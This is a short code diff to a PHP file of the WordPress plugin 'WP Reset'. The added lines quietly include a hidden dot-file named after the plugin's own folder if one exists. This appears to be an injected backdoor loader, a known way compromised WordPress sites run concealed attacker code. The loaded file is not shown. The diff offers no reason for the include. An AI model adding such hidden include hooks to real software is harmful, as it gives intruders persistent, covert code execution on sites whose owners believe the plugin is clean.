@@ -15,7 +15,11 @@ if (!defined('ABSPATH')) {
 
 /**
  * Resets & deletes various WP objects including the whole site. Restore points provided through snapshots.
- */
+ */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class WP_Reset_CLI extends WP_CLI_Command
 {
   /**
